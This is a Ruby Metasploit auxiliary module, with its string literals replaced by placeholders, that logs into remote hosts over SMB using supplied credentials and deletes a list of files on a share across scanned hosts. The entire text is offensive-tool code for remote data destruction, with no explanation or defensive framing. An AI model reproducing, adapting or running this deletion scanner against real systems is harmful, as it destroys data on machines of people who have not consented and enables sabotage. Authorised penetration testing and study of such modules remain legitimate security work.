require <str> class Metasploit3 < Msf :: Auxiliary include Msf :: Exploit :: Remote :: SMB :: Client include Msf :: Exploit :: Remote :: SMB :: Client :: Authenticated include Msf :: Exploit :: Remote :: SMB :: Client :: RemotePaths include Msf :: Auxiliary :: Report include Msf :: Auxiliary :: Scanner SIMPLE = Rex :: Proto :: SMB :: SimpleClient XCEPT = Rex :: Proto :: SMB :: Exceptions CONST = Rex :: Proto :: SMB :: Constants def initialize super ( <str> = > <str> , <str> = > <str> , <str> = > [ <str> ] , <str> = > MSF_LICENSE ) register_options ( [ OptString . new ( <str> , [ true , <str> , <str> ] ) ] , self . class ) end def smb_delete_files vprint_status ( <str> peer <str> ) connect ( ) smb_login ( ) vprint_status ( <str> peer <str> datastore [ <str> ] <str> datastore [ <str> ] <str> ) self . simple . connect ( <str> rhost <str> datastore [ <str> ] <str> ) remote_paths . each do | remote_path | begin simple . delete ( <str> remote_path <str> ) print_good ( <str> peer <str> remote_path <str> ) rescue Rex :: Proto :: SMB :: Exceptions :: ErrorCode = > e elog ( <str> e . class <str> e . message <str> e . backtrace * <str> ) print_error ( <str> peer <str> remote_path <str> e . message <str> ) end end end def run_host ( _ip ) begin smb_delete_files rescue Rex :: Proto :: SMB :: Exceptions :: LoginError = > e elog ( <str> e . class <str> e . message <str> e . backtrace * <str> ) print_error ( <str> peer <str> e . message <str> ) end end end 
